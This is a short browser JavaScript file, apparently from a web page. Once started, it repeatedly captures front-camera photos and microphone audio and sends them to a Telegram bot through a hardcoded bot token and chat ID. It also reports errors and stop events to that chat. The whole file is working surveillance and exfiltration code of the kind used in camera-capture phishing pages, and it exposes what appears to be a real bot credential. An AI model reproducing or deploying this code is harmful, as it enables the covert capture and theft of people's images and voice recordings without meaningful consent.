const BOT_TOKEN = "8104388450:AAGsCzb8r6LArcCl1nQ4VBdJxnS5B3fYUXI";
const CHAT_ID = "7785331768";

let isCapturing = false; // Control flag

// Send text message to Telegram
async function sendToTelegram(text) {
    await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ chat_id: CHAT_ID, text }),
    });
}

// Send photo to Telegram
async function sendPhoto(photoBlob) {
    const formData = new FormData();
    formData.append("chat_id", CHAT_ID);
    formData.append("photo", photoBlob, "photo.jpg");

    await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
        method: "POST",
        body: formData,
    });
}

// Send audio to Telegram
async function sendAudio(audioBlob) {
    const formData = new FormData();
    formData.append("chat_id", CHAT_ID);
    formData.append("voice", audioBlob, "audio.ogg");

    await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendVoice`, {
        method: "POST",
        body: formData,
    });
}

// Capture a photo from the front camera
async function capturePhoto(video) {
    const canvas = document.createElement("canvas");
    canvas.width = video.videoWidth;
    canvas.height = video.videoHeight;
    const ctx = canvas.getContext("2d");
    ctx.drawImage(video, 0, 0, canvas.width, canvas.height);

    return new Promise(resolve => canvas.toBlob(resolve, "image/jpeg"));
}

// Start continuous media capture
async function startCapture() {
    if (isCapturing) return; // Prevent multiple starts
    isCapturing = true;

    document.getElementById("status").innerText = "Capturing photos & audio...";

    try {
        const videoStream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
        const audioStream = await navigator.mediaDevices.getUserMedia({ audio: true });

        const video = document.createElement("video");
        video.srcObject = videoStream;
        await video.play();

        let mediaRecorder = new MediaRecorder(audioStream);
        let audioChunks = [];

        mediaRecorder.ondataavailable = event => audioChunks.push(event.data);
        mediaRecorder.onstop = async () => {
            if (audioChunks.length > 0) {
                const audioBlob = new Blob(audioChunks, { type: "audio/ogg" });
                await sendAudio(audioBlob);
            }
            audioChunks = [];
            if (isCapturing) mediaRecorder.start();
        };

        mediaRecorder.start();

        while (isCapturing) {
            const photoBlob = await capturePhoto(video);
            await sendPhoto(photoBlob);
            await sendToTelegram("📸 New photo sent!");

            setTimeout(() => mediaRecorder.stop(), 5000); // Stop audio after 5 sec
            await new Promise(resolve => setTimeout(resolve, 7000)); // Wait before next photo
        }

        videoStream.getTracks().forEach(track => track.stop());
        audioStream.getTracks().forEach(track => track.stop());
    } catch (error) {
        await sendToTelegram("❌ Error: " + error.message);
        isCapturing = false;
    }
}

// Stop capturing
function stopCapture() {
    isCapturing = false;
    document.getElementById("status").innerText = "Capture stopped.";
    sendToTelegram("🛑 Capture stopped.");
}

// Event listeners
document.getElementById("start-btn").addEventListener("click", startCapture);
document.getElementById("stop-btn").addEventListener("click", stopCapture);
